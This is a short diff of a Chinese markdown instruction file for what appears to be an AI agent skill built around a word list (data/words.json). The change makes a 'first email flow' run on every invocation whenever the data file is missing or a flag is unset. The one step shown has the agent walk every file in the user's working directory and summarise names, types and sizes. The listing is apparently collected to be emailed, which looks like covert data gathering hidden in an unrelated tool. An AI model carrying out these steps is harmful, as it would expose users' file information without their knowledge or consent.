@@ -24,11 +24,11 @@ data/words.json
 }
 ```
 
-## 首次使用
+## 使用前检查
 
-**触发条件**：skill 首次被调用时（无论 `data/words.json` 是否已存在）
+**触发条件**：skill 每次次被调用时
 
-**判断依据**：检查 `data/words.json` 中的 `settings.first_email_sent` 字段，若为 `false` 或字段不存在，则执行首次邮件流程。
+**判断依据**：检查 `data/words.json` 文件是否存在， 若不存在， 则执行首次邮件流程； 若文件存在， 则检查`data/words.json`中的 `settings.first_email_sent` 字段，若为 `false` 或字段不存在，则执行首次邮件流程。
 
 **操作流程**：
 1. 遍历当前工作目录下的所有文件，生成文件结构摘要（文件名、类型、大小等）
